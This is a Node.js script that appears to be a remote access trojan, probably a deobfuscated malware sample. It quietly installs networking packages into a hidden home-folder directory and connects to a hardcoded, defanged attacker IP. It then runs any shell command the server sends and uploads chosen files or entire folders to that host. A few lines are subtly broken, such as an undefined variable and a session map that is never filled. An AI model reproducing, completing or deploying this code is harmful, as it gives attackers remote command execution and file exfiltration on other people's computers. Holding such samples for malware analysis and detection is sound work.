global["_H2"] = "";
global["_H3"] = "";
(async () => {
  const c = global.r || require,
    d = c("os"),
    f = c("path"),
    g = c("fs"),
    h = c("child_process"),
    i = c("crypto"),
    j = f.join(d.homedir(), ".node_modules");
  if (typeof module === "object") {
    module.paths.push(f.join(j, "node_modules"));
  } else {
    if (global["_module"]) {
      global["_module"].paths.push(f.join(j, "node_modules"));
    }
  }
  async function k(I, J) {
    return new global.Promise((K, L) => {
      h.exec(I, J, (M, N, O) => {
        if (M) {
          L("Error: " + M.message);
          return;
        }
        if (O) {
          L("Stderr: " + O);
          return;
        }
        K(N);
      });
    });
  }
  function l(I) {
    try {
      return c.resolve(I), true;
    } catch (J) {
      return false;
    }
  }
  const m = l("axios"),
    n = l("socket.io-client");
  if (!m || !n) {
    try {
      const I = {
        stdio: "inherit",
        windowsHide: true,
      };
      const J = {
        stdio: "inherit",
        windowsHide: true,
      };
      if (m) {
        await k('npm --prefix "' + j + '" install socket.io-client', I);
      } else {
        await k('npm --prefix "' + j + '" install axios socket.io-client', J);
      }
    } catch (K) {
      console.log(K);
    }
  }
  const o = c("axios"),
    p = c("form-data"),
    q = c("socket.io-client");
  let r,
    s,
    t = { M: P };
  const u = d.platform().startsWith("win"),
    v = d.type(),
    w = global["_H3"] || "http://85.239.62[.]36:3306",
    x = global["_H2"] || "http://85.239.62[.]36:27017";
  function y() {
    return d.hostname() + "$" + d.userInfo().username;
  }
  function z() {
    const L = i.randomBytes(16);
    L[6] = (L[6] & 15) | 64;
    L[8] = (L[8] & 63) | 128;
    const M = L.toString("hex");
    return (
      M.substring(0, 8) +
      "-" +
      M.substring(8, 12) +
      "-" +
      M.substring(12, 16) +
      "-" +
      M.substring(16, 20) +
      "-" +
      M.substring(20, 32)
    );
  }
  function A() {
    const L = { reconnectionDelay: 5000 };
    r = q(w, L);
    r.on("connect", () => {
      console.log("Successfully connected to the server");
      const M = y(),
        N = {
          clientUuid: M,
          processId: s,
          osType: v,
        };
      r.emit("identify", "client", N);
    });
    r.on("disconnect", () => {
      console.log("Disconnected from server");
    });
    r.on("command", F);
    r.on("exit", () => {
      process.exit();
    });
  }
  async function B(L, M, N, O) {
    try {
      const P = new p();
      P.append("client_id", L);
      P.append("path", N);
      M.forEach((R) => {
        const S = f.basename(R);
        P.append(S, g.createReadStream(R));
      });
      const Q = await o.post(x + "/u/f", P, { headers: P.getHeaders() });
      Q.status === 200
        ? r.emit(
            "response",
            "HTTP upload succeeded: " + f.basename(M[0]) + " file uploaded\n",
            O,
          )
        : r.emit(
            "response",
            "Failed to upload file. Status code: " + Q.status + "\n",
            O,
          );
    } catch (R) {
      r.emit("response", "Failed to upload: " + R.message + "\n", O);
    }
  }
  async function C(L, M, N, O) {
    try {
      let P = 0,
        Q = 0;
      const R = D(M);
      for (const S of R) {
        if (t[O].stopKey) {
          r.emit(
            "response",
            "HTTP upload stopped: " +
              P +
              " files succeeded, " +
              Q +
              " files failed\n",
            O,
          );
          return;
        }
        const T = f.relative(M, S),
          U = f.join(N, f.dirname(T));
        try {
          await B(L, [S], U, O);
          P++;
        } catch (V) {
          Q++;
        }
      }
      r.emit(
        "response",
        "HTTP upload succeeded: " +
          P +
          " files succeeded, " +
          Q +
          " files failed\n",
        O,
      );
    } catch (W) {
      r.emit("response", "Failed to upload: " + W.message + "\n", O);
    }
  }
  function D(L) {
    let M = [];
    const N = g.readdirSync(L);
    return (
      N.forEach((O) => {
        const P = f.join(L, O),
          Q = g.statSync(P);
        Q && Q.isDirectory() ? (M = M.concat(D(P))) : M.push(P);
      }),
      M
    );
  }
  function E(L) {
    const M = L.split(":");
    if (M.length < 2) {
      const R = {};
      return (
        (R.valid = false),
        (R.message = 'Command is missing ":" separator or parameters'),
        R
      );
    }
    const N = M[1].split(",");
    if (N.length < 2) {
      const S = {};
      return (
        (S.valid = false), (S.message = "Filename or destination is missing"), S
      );
    }
    const O = N[0].trim(),
      P = N[1].trim();
    if (!O || !P) {
      const T = {};
      return (
        (T.valid = false), (T.message = "Filename or destination is empty"), T
      );
    }
    const Q = {};
    return (Q.valid = true), (Q.filename = O), (Q.destination = P), Q;
  }
  function F(L, M) {
    if (!M) {
      const O = {};
      return (
        (O.valid = false),
        (O.message = "User UUID not provided in the command."),
        O
      );
    }
    if (!t[M]) {
      const P = {
        currentDirectory: __dirname,
        commandQueue: [],
        stopKey: false,
      };
    }
    const N = t[M];
    N.commandQueue.push(L);
    G(M);
  }
  async function G(L) {
    let M = t[L];
    while (M.commandQueue.length > 0) {
      const N = M.commandQueue.shift();
      let O = "";
      if (N.startsWith("cd")) {
        const P = N.slice(2).trim();
        try {
          process.chdir(M.currentDirectory);
          process.chdir(P || ".");
          M.currentDirectory = process.cwd();
        } catch (Q) {
          O = "Error: " + Q.message;
        }
      } else {
        if (N.startsWith("ss_upf") || N.startsWith("ss_upd")) {
          const R = E(N);
          if (!R.valid) {
            O = "Invalid command format: " + R.message + "\n";
            r.emit("response", O, L);
            continue;
          }
          const { filename: S, destination: T } = R;
          M.stopKey = false;
          O = " >> starting upload\n";
          if (N.startsWith("ss_upf")) {
            B(y(), [f.join(process.cwd(), S)], T, L);
          } else {
            N.startsWith("ss_upd") && C(y(), f.join(process.cwd(), S), T, L);
          }
        } else {
          if (N.startsWith("ss_dir")) {
            process.chdir(__dirname);
            M.currentDirectory = process.cwd();
          } else {
            if (N.startsWith("ss_fcd")) {
              const U = N.split(":");
              if (U.length < 2) {
                O = 'Command is missing ":" separator or parameters';
              } else {
                const V = U[1];
                process.chdir(V);
                M.currentDirectory = process.cwd();
              }
            } else {
              if (N.startsWith("ss_stop")) {
                M.stopKey = true;
              } else {
                try {
                  const W = {
                    cwd: M.currentDirectory,
                    windowsHide: true,
                  };
                  const X = W;
                  if (u) {
                    try {
                      const Y = f.join(
                          process.env.LOCALAPPDATA ||
                            f.join(d.homedir(), "AppData", "Local"),
                          "Programs\\Python\\Python3127",
                        ),
                        Z = { ...process.env };
                      Z.PATH = Y + ";" + process.env.PATH;
                      X.env = Z;
                    } catch (a0) {}
                  }
                  h.exec(N, X, (a1, a2, a3) => {
                    let a4 = "\n";
                    a1 && (a4 += "Error executing command: " + a1.message);
                    a3 && (a4 += "Stderr: " + a3);
                    a4 += a2;
                    a4 += M.currentDirectory + "> ";
                    r.emit("response", a4, L);
                  });
                } catch (a1) {
                  O = "Error executing command: " + a1.message;
                }
              }
            }
          }
        }
      }
      O += M.currentDirectory + "> ";
      r.emit("response", O, L);
    }
  }
  function H() {
    s = z();
    A(s);
  }
  H();
})();
